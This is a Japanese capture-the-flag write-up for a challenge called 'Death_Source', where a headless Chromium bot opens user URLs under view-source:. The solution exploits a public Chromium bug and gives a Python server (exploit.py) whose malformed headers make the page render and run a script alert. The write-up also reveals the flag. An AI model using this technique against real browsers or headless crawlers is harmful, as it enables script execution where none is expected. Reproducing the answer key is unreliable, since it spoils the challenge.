# 🥵 Death_Source

## 問題文
ネット上のソースは全部安全なはずです。  
alertなんてできませんよね？  
フラグは`flag{文字列}`の形式で、`process.env.FLAG`に入っています。  
[http://localhost:3000?url=https://example.com](http://localhost:3000?url=https://example.com)  
[app.js](files/app.js)  

## 難易度
**2割解ける**  

## 作問にあたって
Chromiumの脆弱性？を使った問題です。  
私が見つけたわけではないですが、公開されており面白そうな挙動だったので問題にしました。  
詳細は「[Issue 1281137: Omnibox removes view-source: and renders the page without displaying the HTML source](https://bugs.chromium.org/p/chromium/issues/detail?id=1281137)」です。  
簡単に言うと`view-source:`へのアクセスでJavaScriptを動かすことができます。  

## 解法
URLにアクセスすると、`?url=`で指定されたページの"ソースの表示ソース"を表示しているサイトのようだ。  
配布されたapp.jsの中身は以下のようであった。  
```JavaScript
~~~
async function http_get(url) {
    const browser = await playwright.chromium.launch({headless: true});
    const context = await browser.newContext();
    const page = await context.newPage();

    let flag = "This source code is yummy !!!<br>";

    page.on("dialog", async dialog => {
        /* <script>alert('Satoki');</script> */
        if (dialog.type() === "alert") {
            flag = process.env.FLAG; // Congrats!
            console.log("[flag]: " + url);
        }
        await dialog.accept();
    });

    /* Can you execute JavaScript on view-source: ? */
    try {
        // First bite
        await page.goto("view-source:" + url, {timeout: 2000});
        flag += "<pre><code>" + sanitize(beautify.html(await page.content())) + "</code></pre>";
    } catch (error) {console.log("[error]: " + error);}
    await page.waitForTimeout(100);

    try {
        // Second bite
        await page.reload();
    } catch (error) {console.log("[error]: " + error);}
    await page.waitForTimeout(100);

    await browser.close();

    return flag;
}
~~~
```
ユーザからのURLをplaywright.chromiumの`view-source:`で開いてリロードしている。  
コメントの通り`view-source:`でJavaScriptを実行して、alertを出せばよいようだ。  
ツイッターで「chromium view-source: lang:ja」と検索すると[発見者のツイート](https://twitter.com/reinforchu/status/1471995823684984835)が出てくる。  
さらに調べると[報告ツイート](https://twitter.com/reinforchu/status/1472414835849990147)が見つかる。  
「[Issue 1281137: Omnibox removes view-source: and renders the page without displaying the HTML source](https://bugs.chromium.org/p/chromium/issues/detail?id=1281137)」に詳細が記されており、エラーページのリダイレクト時に`view-source:`が欠落するバグのようだ。  
PoCが同ページより手に入るのでcsファイルを実行するか、自前でサーバを実装すればよい。  
pythonで実装しなおしたサーバスクリプトexploit.pyは以下になる。  
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

address = ("0.0.0.0", 4000)

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        if self.headers["Cache-Control"]:
            self.send_header("Content-Length", "32")
        else:
            self.send_header("Content-Disposition", "form-data; name=\"ieldName\"; filename=\"Chromium_Bug\",inline")
        self.end_headers()
        self.wfile.write(b"<script>alert('imctf');</script>")

with HTTPServer(address, MyHTTPRequestHandler) as server:
    server.serve_forever()
```
これをどこかで実行して、問題サーバにそのアドレスを投げればよい。  
```bash
$ curl 'http://localhost:3000/?url=http://localhost:4000'
flag{Did_you_lick_Death_Sauce_???}
```
flagが得られた。  

## flag{Did_you_lick_Death_Sauce_???}